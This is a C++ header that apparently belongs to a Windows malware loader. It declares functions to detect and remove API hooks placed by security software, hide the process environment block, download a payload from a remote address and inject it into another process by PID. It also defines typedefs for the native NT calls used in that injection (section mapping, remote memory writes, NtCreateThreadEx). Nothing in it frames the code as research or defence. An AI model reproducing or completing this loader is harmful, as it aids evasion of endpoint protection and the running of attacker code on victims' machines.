#pragma once
#include <Windows.h>
#include <iostream> 
#include <tlhelp32.h>
#include <tchar.h>
#include <winnt.h>
#include <ntstatus.h>
#include <winternl.h>
#include <vector>


// Functions definitions
BOOL isItHooked(LPVOID addr);
void unhook(); 
void hidePEB();
std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
DWORD GetPID();
void execution(std::vector<BYTE> sh, DWORD exPID);



// Structures definitions
typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(HANDLE ProcessHandle,PVOID* BaseAddress,ULONG_PTR ZeroBits,PSIZE_T RegionSize,ULONG AllocationType,ULONG Protect);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateThreadEx)(_Out_ PHANDLE hThread,_In_  ACCESS_MASK DesiredAccess,_In_  LPVOID ObjectAttributes,_In_  HANDLE ProcessHandle,_In_  LPTHREAD_START_ROUTINE lpStartAddress,_In_  LPVOID lpParameter,_In_  BOOL CreateSuspended,_In_  DWORD StackZeroBits,_In_  DWORD SizeOfStackCommit,_In_  DWORD SizeOfStackReserve,_Out_ LPVOID lpBytesBuffer);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtWriteVirtualMemory)(_In_ HANDLE ProcessHandle,_In_opt_ PVOID BaseAddress,_In_ VOID* Buffer,_In_ SIZE_T BufferSize,_Out_opt_ PSIZE_T NumberOfBytesWritten);
typedef public NTSTATUS(NTAPI* _NtProtectVirtualMemory) (HANDLE, IN OUT PVOID*, IN OUT PSIZE_T, IN ULONG, OUT PULONG);
typedef public NTSTATUS(NTAPI* _NtQueryInformationThread) (IN HANDLE ThreadHandle, IN THREADINFOCLASS ThreadInformationClass, OUT PVOID ThreadInformation, IN ULONG ThreadInformationLength, OUT PULONG ReturnLength);
using NtCreateSection = NTSTATUS(NTAPI*)(OUT PHANDLE SectionHandle,IN ULONG DesiredAccess,IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,IN OPTIONAL PLARGE_INTEGER MaximumSize,IN ULONG PageAttributess,IN ULONG SectionAttributes,IN OPTIONAL HANDLE FileHandle);
using NtMapViewOfSection = NTSTATUS(NTAPI*)(IN HANDLE SectionHandle,IN HANDLE ProcessHandle,IN OUT PVOID* BaseAddress,IN ULONG_PTR ZeroBits,IN SIZE_T CommitSize,IN OUT OPTIONAL PLARGE_INTEGER SectionOffset,IN OUT PSIZE_T ViewSize,IN DWORD InheritDisposition,IN ULONG AllocationType,IN ULONG Win32Protect);
using NtUnmapViewOfSection = NTSTATUS(NTAPI*)(IN HANDLE ProcessHandle,IN PVOID BaseAddress OPTIONAL);
typedef enum _SECTION_INHERIT : DWORD {	ViewShare = 1,ViewUnmap = 2} SECTION_INHERIT, * PSECTION_INHERIT;